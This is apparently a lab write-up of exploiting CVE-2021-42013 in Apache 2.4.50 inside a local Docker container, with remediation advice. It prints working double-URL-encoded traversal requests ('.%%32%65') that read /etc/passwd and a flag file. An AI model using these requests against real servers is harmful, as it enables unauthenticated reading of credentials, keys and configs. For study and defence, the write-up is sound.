# Lab — Apache Path Traversal via Double URL Encoding

**CVE:** CVE-2021-42013
**Service:** Apache httpd 2.4.50
**Target:** Docker-based vulnerable Apache container
**Vulnerability Type:** Path Traversal / Potential RCE
**Criticality:** Critical (CVSS 9.8)

---

## Phase Recon

Confirmed the web application was running and identified the server banner:

```bash
curl -I http://localhost
```

Response headers revealed:

```
Server: Apache/2.4.50 (Unix)
```

Apache 2.4.50 is specifically vulnerable to CVE-2021-42013, a bypass of the incomplete fix for CVE-2021-41773 (path traversal in Apache 2.4.49). Both versions allow an attacker to traverse outside the web root using encoded path sequences.

---

## Phase Exploit — Path Traversal

Standard `../` traversal attempts were blocked by server-side input validation, returning `400 Bad Request`. The bypass uses **double URL encoding**:

- `.` = `%2e`
- `%%32%65` double-encodes the `.` character, bypassing single-pass sanitization

Starting point provided by the application's `/icons/` alias directory:

```
/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/
```

Each `/.%%32%65/` segment decodes to `/../` after two passes — traversing one directory level up.

Tested traversal depth incrementally using a known file (`/etc/passwd`) to confirm how many levels were needed to reach the filesystem root from `/icons/`:

```bash
curl -L "http://localhost/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
```

A `301 Moved Permanently` response at four levels of traversal confirmed the correct depth. Following the redirect with `-L` returned the file contents successfully.

---

## Phase — Flag File Retrieval

Located the target file using the confirmed traversal path:

```bash
curl -L "http://localhost/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/flag"
```

The file returned binary/encoded data — not readable as plain text. Saved the file and used the `strings` command to extract printable character sequences:

```bash
strings flag
```

The hidden string was identified within the binary output — demonstrating that sensitive data embedded in binary files can be recovered with basic forensic tooling.

---

## Criticality Assessment

**Rating: Critical (CVSS 9.8)**

In a real-world business environment:

- **Unauthenticated** — no login required
- **Remotely exploitable** — accessible from anywhere the web server is reachable
- **Arbitrary file read** — attacker can read any file the Apache process has access to, including `/etc/shadow`, application configs, private keys, and environment files
- **RCE potential** — if CGI is enabled on the aliased path, this vulnerability escalates to full remote code execution
- **Widespread exposure** — Apache 2.4.49 and 2.4.50 were widely deployed; this was actively exploited in the wild shortly after disclosure

Immediate remediation: upgrade to Apache 2.4.51 or later, audit `Alias` directive configurations, and ensure `Require all denied` is enforced for non-web directories.

---

## Key Takeaways

- Input validation that only performs a single decoding pass can be bypassed with double URL encoding — always test both standard and encoded traversal sequences
- The `%%32%65` technique works because the server decodes `%32` → `2` and `%65` → `e` on the first pass, producing `%2e`, which decodes to `.` on the second pass
- `strings` is an underutilized tool — it extracts human-readable content from binary files and is essential for basic file forensics
- A `301 Moved Permanently` during path traversal testing is a positive signal — the server found the path but redirected; follow it with `-L`
- Server banners in HTTP response headers directly expose version information — always check with `curl -I`
